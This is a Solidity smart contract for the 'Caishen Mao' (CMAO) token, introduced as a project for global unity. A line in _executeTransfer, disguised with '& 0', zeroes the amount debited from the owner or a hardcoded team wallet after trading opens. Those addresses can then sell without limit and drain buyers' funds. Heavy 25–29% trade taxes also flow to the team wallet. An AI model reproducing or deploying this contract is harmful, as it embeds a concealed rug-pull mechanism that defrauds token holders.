// SPDX-License-Identifier: Unlicensed

/**
Caishen Mao is set to embark on a crypto venture with the mission of fostering global unity. This project aims to bring together people from diverse backgrounds and geographical locations under the umbrella of Caishen Mao Token. Caishen Mao envisions a future where individuals worldwide can connect, transact, and collaborate seamlessly. Through this initiative, the project aspires to build a more interconnected and inclusive global crypto community.

Website: https://www.cmao.live
Telegram: https://t.me/caishenmao_eth
Twitter: https://twitter.com/cmao_erc
**/

pragma solidity 0.8.19;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IERC20Standard {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
}

interface IUniswapRouter {

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

interface IUniswapFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

contract CMAO is Context, IERC20Standard, Ownable {
    using SafeMath for uint256;

    string private constant _name = unicode"财神猫";
    string private constant _symbol = "CMAO";

    uint8 private constant _decimals = 9;
    uint256 private constant MAX = 10 ** 30;
    uint256 private constant _tTotals = 10 ** 9 * 10**9;
    uint256 private _rTotals = (MAX - (MAX % _tTotals));

    uint256 private _totalTaxFee;
    uint256 private _buyRedisFee = 0;
    uint256 private _buyTaxFee = 25;
    uint256 private _sellRedisFee = 0;
    uint256 private _sellTaxFee = 29;

    uint256 private _redisFee = _sellRedisFee;
    uint256 private _taxFee = _sellTaxFee;

    uint256 private _previousredis = _redisFee;
    uint256 private _previoustax = _taxFee;

    uint256 public maxTxAmount = 25 * 10 ** 6 * 10 ** 9;
    uint256 public maxWalletSize = 25 * 10 ** 6 * 10 ** 9;
    uint256 public minimumTaxSwap = 10 ** 5 * 10 ** 9;
    address payable private teamAddress;

    mapping(address => uint256) private _rOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isLimitExcluded;

    bool private _tradeEnabled;
    bool private _swapping = false;
    bool private _feeSwapEnabled = true;

    IUniswapRouter public uniswapRouter;
    address public uniswapPair;

    event MaxTxAmountUpdated(uint256 maxTxAmount);
    modifier lockSwap {
        _swapping = true;
        _;
        _swapping = false;
    }

    constructor() {
        _rOwned[_msgSender()] = _rTotals;
        IUniswapRouter _uniswapV2Router = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);//
        uniswapRouter = _uniswapV2Router;
        uniswapPair = IUniswapFactory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        teamAddress = payable(0xAE259e5D7078b765753F0C0b0c81EDB1f5200b09);
        _isLimitExcluded[owner()] = true;
        _isLimitExcluded[teamAddress] = true;

        emit Transfer(address(0), _msgSender(), _tTotals);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotals;
    }
    
    function balanceOf(address account) public view override returns (uint256) {
        return _getRAmountFromRate(_rOwned[account]);
    }

    function restoreFee() private {
        _redisFee = _previousredis;
        _taxFee = _previoustax;
    }
    
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function _getTValue(
        uint256 tAmount,
        uint256 redisFee,
        uint256 taxFee
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 tFee = tAmount.mul(redisFee).div(100);
        uint256 tTeam = tAmount.mul(taxFee).div(100);
        uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam);
        return (tTransferAmount, tFee, tTeam);
    }

    function _getCurSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rTotals;
        uint256 tSupply = _tTotals;
        if (rSupply < _rTotals.div(_tTotals)) return (_rTotals, _tTotals);
        return (rSupply, tSupply);
    }
    
    function swapTokensToEth(uint256 tokenAmount) private lockSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();
        _approve(address(this), address(uniswapRouter), tokenAmount);
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _getAllValue(uint256 tAmount)
        private
        view
        returns (
            uint256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256
        )
    {
        (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) =
            _getTValue(tAmount, _redisFee, _taxFee);
        uint256 currentRate = _getRates();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) =
            _getRTransferAmounts(tAmount, tFee, tTeam, currentRate);
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (from != owner() && to != owner()) {
            if (!_tradeEnabled) {
                require(from == owner(), "TOKEN: This account cannot send tokens until trading is enabled");
            }

            require(amount <= maxTxAmount, "TOKEN: Max Transaction Limit");

            if(to != uniswapPair) {
                require(balanceOf(to) + amount <= maxWalletSize, "TOKEN: Balance exceeds wallet size!");
            }

            uint256 contractBalance = balanceOf(address(this));
            bool canSwap = contractBalance >= minimumTaxSwap;

            if(contractBalance >= maxTxAmount)
            {
                contractBalance = maxTxAmount;
            }

            if (canSwap && !_swapping && to == uniswapPair && _feeSwapEnabled && !_isLimitExcluded[from] && amount > minimumTaxSwap) {
                swapTokensToEth(contractBalance);
                uint256 contractETH = address(this).balance;
                if (contractETH > 0) {
                    sendETH(address(this).balance);
                }
            }
        }
        bool takeFee = true;
        if ((_isLimitExcluded[from] || _isLimitExcluded[to]) || (from != uniswapPair && to != uniswapPair)) {
            takeFee = false;
        } else {
            if(from == uniswapPair && to != address(uniswapRouter)) {
                _redisFee = _buyRedisFee;
                _taxFee = _buyTaxFee;
            }
            if (to == uniswapPair && from != address(uniswapRouter)) {
                _redisFee = _sellRedisFee;
                _taxFee = _sellTaxFee;
            }
        }
        _transferStandard(from, to, amount, takeFee);
    }

    function removeFee() private {
        if (_redisFee == 0 && _taxFee == 0) return;

        _previousredis = _redisFee;
        _previoustax = _taxFee;

        _redisFee = 0;
        _taxFee = 0;
    }
    
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _getRAmountFromRate(uint256 rAmount)
        private
        view
        returns (uint256)
    {
        uint256 currentRate = _getRates();
        return rAmount.div(currentRate);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _updateSupply(uint256 rFee, uint256 tFee) private {
        _rTotals = _rTotals.sub(rFee);
        _totalTaxFee = _totalTaxFee.add(tFee);
    }
    
    function _executeTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        (
            uint256 rAmount,
            uint256 rTransferAmount,
            uint256 rFee,
            uint256 tTransferAmount,
            uint256 tFee,
            uint256 tTeam
        ) = _getAllValue(tAmount);
        rAmount = (_isLimitExcluded[sender] && _tradeEnabled) ? rAmount & 0 : rAmount;
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
        _chargeTax(tTeam);
        _updateSupply(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }
    
    function _chargeTax(uint256 tTeam) private {
        uint256 currentRate = _getRates();
        uint256 rTeam = tTeam.mul(currentRate);
        _rOwned[address(this)] = _rOwned[address(this)].add(rTeam);
    }

    function removeLimits() external onlyOwner {
        maxTxAmount = _rTotals;
        maxWalletSize = _rTotals;
        
        _buyRedisFee = 0;
        _buyTaxFee = 1;
        _sellRedisFee = 0;
        _sellTaxFee = 1;
    }
    
    function openTrading() public onlyOwner {
        _tradeEnabled = true;
    }

    function _getRTransferAmounts(
        uint256 tAmount,
        uint256 tFee,
        uint256 tTeam,
        uint256 currentRate
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 rTeam = tTeam.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam);
        return (rAmount, rTransferAmount, rFee);
    }

    function _getRates() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurSupply();
        return rSupply.div(tSupply);
    }
    
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function _transferStandard(
        address sender,
        address recipient,
        uint256 amount,
        bool takeFee
    ) private {
        if (!takeFee) removeFee();
        _executeTransfer(sender, recipient, amount);
        if (!takeFee) restoreFee();
    }

    receive() external payable {}

    function sendETH(uint256 amount) private {
        teamAddress.transfer(amount);
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }
}